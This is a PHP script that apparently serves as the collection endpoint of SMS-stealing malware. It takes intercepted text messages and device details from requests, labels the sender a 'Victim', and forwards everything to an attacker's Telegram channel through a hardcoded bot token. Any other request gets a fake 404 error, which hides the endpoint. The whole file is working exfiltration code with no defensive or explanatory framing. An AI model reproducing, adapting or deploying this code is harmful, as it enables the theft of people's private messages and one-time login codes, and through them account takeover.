<?php

require_once("functions.php");

$telegram_api_key = "5088376749:AAHZQiOttMTFCjkGH3b-XR5r0gCmubHt95A";
$telegram_channel_or_group_id = "-1001656743940";

if (isset($_REQUEST['sms']) && isset($_REQUEST['device-info'])) {
    
    $telegram_bot_message = $_REQUEST['device-info']."\nVictim IP=> https://whatismyipaddress.com/ip/".getIpAddress()."\nMessage Body=> {".$_REQUEST['sms']."}";
    sendTelegramMessage($telegram_api_key, $telegram_channel_or_group_id, urlencode($telegram_bot_message));

}
else{
    http_response_code(404);
    echo "Error 404";
}

?>